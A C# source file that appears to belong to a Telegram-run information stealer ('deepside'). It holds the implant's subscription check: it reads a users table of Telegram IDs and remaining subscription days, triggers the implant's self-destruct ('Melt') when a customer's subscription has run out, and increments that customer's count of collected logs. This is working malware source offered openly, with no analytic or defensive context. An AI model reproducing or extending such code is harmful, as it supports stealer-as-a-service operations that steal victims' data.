using System;
using System.Data.SQLite;
using System.IO;
using System.Net.Http.Formatting;

namespace deepsidestubility
{
    class Databasedem
    {
        public SQLiteConnection myConnection;

        public Databasedem()
        {
            myConnection = new SQLiteConnection("Data Source=C:\\Users\\nikitageak\\Desktop\\stealer\\Bot_telegram\\resources\\db.sqlite3");
            if (File.Exists("C:\\Users\\nikitageak\\Desktop\\stealer\\Bot_telegram\\resources\\db.sqlite3"))
            {
                //System.//Console.WriteLine("havedb!");
            }
        }
        public void OpenConnection()
        {
            if (myConnection.State != System.Data.ConnectionState.Open)
            {
                myConnection.Open();
                ////System.Console.WriteLine("Connect!");
            }
        }
        public void CloseConnection()
        {
            if(myConnection.State != System.Data.ConnectionState.Closed)
            {
                myConnection.Close();
                ////System.Console.WriteLine("Closed!");
            }
        }
        public static void CheckData()
        {
            Databasedem databaseobj = new Databasedem();
            string query = "SELECT * FROM users";
            SQLiteCommand myCommand = new SQLiteCommand(query, databaseobj.myConnection);
            databaseobj.OpenConnection();
            SQLiteDataReader result = myCommand.ExecuteReader();
            Int64 teleid = Int64.Parse(deepside.Config.TelegramID);
            if (result.HasRows)
            {
                while (result.Read())
                {
                    var telegram_id = result.GetInt64(1);
                    var sub_day = result.GetInt64(2);
                    if (telegram_id == teleid)
                    {
                        if (sub_day <= 0)
                        {
                            deepside.Implant.SelfDestruct.Melt();
                        }
                    }
                }
            }

            string query2 = $"UPDATE users SET logs_counter = logs_counter + 1 WHERE telegram_id = {teleid}";
            var SqliteCmd = new SQLiteCommand();//Initialize the SqliteCommand
            SqliteCmd = databaseobj.myConnection.CreateCommand();
            SqliteCmd.CommandText = query2;//Assigning the query to CommandText
            int addRowsCount = SqliteCmd.ExecuteNonQuery();//Execute the SqliteCommand
            databaseobj.CloseConnection();
        }
    }
}
